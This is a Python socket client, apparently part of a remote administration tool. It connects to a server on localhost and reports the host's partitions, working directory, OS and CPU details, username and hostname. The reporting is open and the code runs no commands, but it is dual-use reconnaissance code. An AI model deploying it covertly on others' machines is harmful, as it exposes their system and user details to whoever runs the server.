import socket
import subprocess
import os
import sys
import platform
import time
import psutil
import getpass

class RemoteClient(object):

    def __init__(self,Ip,PortId,CharSet="utf-16",Buffering=1024):
       self.Ip=Ip                   #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId           #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)     #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet         #Character Set For Encoding And Decoding
       self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)

    def Connect(self):
        #Connect To The Server:
        self.client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        self.client_socket.connect(self.Address)

    def send(self,data):
        #Send data as chunks 
        for i in range(0,len(data),self.Buffering):
            chunk =data[i:i+self.Buffering]
            if chunk=="EOF":
                self.client_socket.send(chunk.lower().encode(self.CharSet))
            else:
                self.client_socket.send(chunk.encode(self.CharSet))
        
        #Delay before sending data end
        time.sleep(1)
        self.client_socket.send("EOF".encode(self.CharSet))
        time.sleep(1)
        #Delay after sending data end
        return None

    def recv(self):
        #recieve data as chunks
        data=""
        while True:
            chunk=self.client_socket.recv(self.Buffering).decode(self.CharSet)
            if chunk=="EOF":            #check for the <EndOfFile> to determine data end
                break
            else:
                data+=chunk
        return data

    def GetBuffer(self):
        #Recieve the Buffer From Server Side
        return self.recv() 

    def SetBuffer(self):
        #Change The Value Of Buffering
        self.Buffering=int(self.GetBuffer())

    def LocationOfFile(self):
        #Send The  Location of the <client>  File Downloaded Path
        self.send(os.getcwd())
        return None

    def Partitions(self):
        #Get the Partitions of the system
        partitions,mountpoints="",""
        for partition in psutil.disk_partitions():
                partitions+=partition.device
                mountpoints+=partition.mountpoint
        self.send(partitions)
        self.send(mountpoints)

    def PartitionsInfo(self):
        #Get the Partitions information such as Name,Mountpoint,(Fixed,Removed),MemorySize
        partitions_info=""
        for partition in psutil.disk_partitions():
            try:
                Memory_size=psutil.disk_usage(partition.mountpoint).total/(1024*1024*1024)
            except OSError:
                Memory_size=f"The volume does not contain a recognized file system of {self.platform}"
            partitions_info+=f"{partition.device}\t{partition.mountpoint}\t{partition.opts}\t{Memory_size}"+"\n"
        self.send(partitions_info)

    def SysPlatform(self):
        #Retrieve the System platform of the client
        #Windows - win32 , Linux -linux ,Mac -darwin
        self.platform=sys.platform
        self.send(self.platform)

    def SysInfo(self):
        #Retrieve the System information of the client
        Info=f"""System<:>{platform.system()}<,>Release<:>{platform.release()}<,>Version<:>{platform.version()}<,>Architecture<:>{platform.machine()}\nProcessor<:>{platform.processor()}<,>Physical Cores<:>{os.cpu_count()}<,>Total Cores<:>{os.cpu_count()}"""
        self.send(Info)

    def GetUserAndDevice(self):
        self.send(getpass.getuser())
        self.send(platform.node())

    def PathConfig(self):
        #Configure the path for command execution
        path=self.recv()
        if (path[-1]==":"):
            self.path=path+"\\"
            return path
        else:
            self.path=path
            return path

    def VerifyPath(self):
        #check whether the path is correct or not
        path=self.recv()
        self.send("TRUE")if (os.path.exists(path)) else self.send("FALSE")
        return None
        
if __name__=="__main__":
    r=RemoteClient("127.0.0.1",6787)
    r.Connect()
    r.SetBuffer()
    r.Partitions()
    r.LocationOfFile()
    r.SysPlatform()
    r.SysInfo()
    r.PartitionsInfo()
    r.GetUserAndDevice()
    